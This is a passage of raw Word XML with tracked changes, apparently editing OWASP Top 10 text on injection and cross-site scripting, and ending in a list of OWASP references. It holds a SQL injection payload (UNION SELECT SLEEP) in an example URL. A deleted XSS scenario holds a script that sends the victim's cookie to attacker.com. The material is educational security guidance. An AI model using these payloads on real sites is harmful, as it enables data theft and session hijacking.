            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">http://example.com/app/accountView?id=' UNION SELECT </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>SLEEP(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>10</w:t>
      </w:r>
      <w:del w:id="1321" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>);--`</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1322" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>);--</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="073E783F" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1323" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1324" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>```</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0297C07D" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="12C02659" w14:textId="3429C594" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1325" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>This changes the meaning of both queries to return all the records from</w:t>
      </w:r>
      <w:del w:id="1326" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="708BDAE1" w14:textId="418D9010" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1327" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>the accounts table. More dangerous attacks could modify or delete data</w:t>
      </w:r>
      <w:del w:id="1328" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve">, </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="4058E392" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>or even invoke stored procedures.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EDC92B9" w14:textId="77777777" w:rsidR="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1329" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1EF5A60A" w14:textId="77777777" w:rsidR="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1330" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1331" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText># A7:2017 Cross-Site Scripting (XSS)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="50EF9796" w14:textId="77777777" w:rsidR="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1332" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="12973A0D" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1333" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1334" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>## Example Attack Scenario</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="4E9AAF0E" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:moveFrom w:id="1335" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:moveFromRangeStart w:id="1336" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z" w:name="move137923168"/>
    </w:p>
    <w:p w14:paraId="26CB5D42" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="00841D1E" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1337" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:moveFrom w:id="1338" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>**Scenario #</w:t>
        </w:r>
      </w:moveFrom>
      <w:moveFromRangeEnd w:id="1336"/>
      <w:del w:id="1339" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>1**: The application uses untrusted data in the construction of the following HTML snippet without validation or escaping:</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="62C573DB" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1340" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="66CC0DA2" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:moveFrom w:id="1341" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1342" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>`(String) page += "&lt;input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'&gt;";`</w:delText>
        </w:r>
      </w:del>
      <w:moveFromRangeStart w:id="1343" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z" w:name="move137923162"/>
    </w:p>
    <w:p w14:paraId="0A809DF9" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="00841D1E" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1344" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:moveFrom w:id="1345" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">The </w:t>
        </w:r>
      </w:moveFrom>
      <w:moveFromRangeEnd w:id="1343"/>
      <w:del w:id="1346" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>attacker modifies the ‘CC’ parameter in the browser to:</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="0339212B" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1347" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="41BA1B94" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1348" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1349" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>`'&gt;&lt;script&gt;document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie&lt;/script&gt;'`</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="1BC0D603" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1350" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4FDEE204" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1351" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1352" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>This attack causes the victim’s session ID to be sent to the attacker’s website, allowing the attacker to hijack the user’s current session.</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="3491A4BF" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1353" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5269FF70" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1354" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1355" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>**Note**: Attackers can use XSS to defeat any automated Cross-Site Request Forgery (CSRF) defense the application might employ.</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="2D1F3F5E" w14:textId="4779538A" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="22CEBF22" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>## References</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="708747DA" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0C89286D" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1356" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1357" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>###</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1358"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04E0A528" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1359" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="10DC617F" w14:textId="5A4ADB1A" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1360" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* [OWASP</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Proactive Controls: </w:t>
      </w:r>
      <w:del w:id="1361" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>Parameterize Queries</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1362" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">Secure Database </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Access</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>](</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>https://</w:t>
      </w:r>
      <w:del w:id="1363"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1364" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>index.php/OWASP_Proactive_Controls#2:_Parameterize_Queries)</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1365" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">www-project-proactive-controls/v3/en/c3-secure-database) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7194FCCE" w14:textId="747AF4C9" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1366" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1367"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ASVS: V5 Input Validation and </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Encoding](</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>https://</w:t>
      </w:r>
      <w:del w:id="1368"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1369" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>index.php/ASVS_V5_Input_validation_and_output_encoding)</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1370" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>www-project-application-security-verification-standard) -</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7BB36976" w14:textId="2B9BB8B2" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1371" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1372" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1373"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Testing Guide: SQL Injection](https://</w:t>
      </w:r>
      <w:del w:id="1374"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1375" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>index.php/</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1376" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Testing_for_SQL_Injection</w:t>
      </w:r>
      <w:del w:id="1377" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>_(OTG-INPVAL-005)),</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1378" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>)</w:t>
        </w:r>
        <w:r w:rsidR="00B74248">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00B74248">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>[Command Injection</w:t>
      </w:r>
      <w:ins w:id="1379" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
